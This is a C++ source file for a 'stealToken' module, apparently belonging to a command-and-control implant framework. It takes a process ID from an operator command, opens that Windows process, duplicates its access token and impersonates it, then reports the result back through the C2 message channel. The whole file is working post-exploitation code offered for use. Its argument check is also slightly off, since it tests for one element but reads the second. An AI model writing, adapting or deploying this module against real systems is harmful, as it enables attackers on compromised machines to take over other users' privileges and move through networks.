#include "StealToken.hpp"

#include <cstring>

#include "Tools.hpp"

#ifdef __linux__

#elif _WIN32
#include <windows.h>
#endif

using namespace std;

#ifdef __linux__

#elif _WIN32

#endif

const std::string moduleName = "stealToken";


#ifdef _WIN32

__declspec(dllexport) StealToken* StealTokenConstructor() 
{
    return new StealToken();
}

#endif

StealToken::StealToken()
	: ModuleCmd(moduleName)
{
}

StealToken::~StealToken()
{
}

std::string StealToken::getInfo()
{
	std::string info;
	info += "stealToken:\n";
	info += "Steal a token and impersonate the it. You must have administrator privilege. \n";
	info += "exemple:\n";
	info += "- stealToken pid \n";

	return info;
}

int StealToken::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
    int pid=-1;
    if(splitedCmd.size()>0)
        pid = stoi(splitedCmd[1]);

	c2Message.set_instruction(splitedCmd[0]);
	c2Message.set_cmd("");
    c2Message.set_pid(pid);

#ifdef __linux__ 

#elif _WIN32

#endif

	return 0;
}


int StealToken::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	int pid = c2Message.pid();

    std::string result = stealToken(pid);

	c2RetMessage.set_instruction(m_name);
	c2RetMessage.set_cmd("");
	c2RetMessage.set_returnvalue(result);
	return 0;
}

//https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonusera
//https://cpp.hotexamples.com/fr/examples/-/-/LogonUserA/cpp-logonusera-function-examples.html
//https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser
//https://docs.microsoft.com/en-us/windows/win32/secauthz/client-impersonation

std::string StealToken::stealToken(int pid)
{
	std::string result;

    if(pid==-1)
    {
        result+="Incorrect pid\n";
        return result;
    }

#ifdef __linux__ 

    result += "StealToken don't work in linux.\n";

#elif _WIN32

    int target = pid;

    HANDLE processHandle;
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));

    HANDLE tokenHandle;
    // TODO pas besoin de TOKEN_ALL_ACCESS
    if(OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle))
    {
        HANDLE newToken;
        // TODO see security attributes
        if(DuplicateTokenEx(tokenHandle, 0, nullptr, SecurityImpersonation, TokenImpersonation, &newToken))
        {
            if(ImpersonateLoggedOnUser(newToken))
            {
                result += "Impersonate steal token successfully.\n";
            }
            else
            {
                result += "Fail to impersonate token.\n";
            }

            CloseHandle(processHandle);
            CloseHandle(tokenHandle);
            CloseHandle(newToken);
        }
        else
        {
            CloseHandle(processHandle);
            CloseHandle(tokenHandle);
            result += "Unable to DuplicateTokenEx.\n";
        }
    }
    else
    {
        CloseHandle(processHandle);
        result += "Unable to OpenProcessToken.\n";
    }

#endif

	return result;
}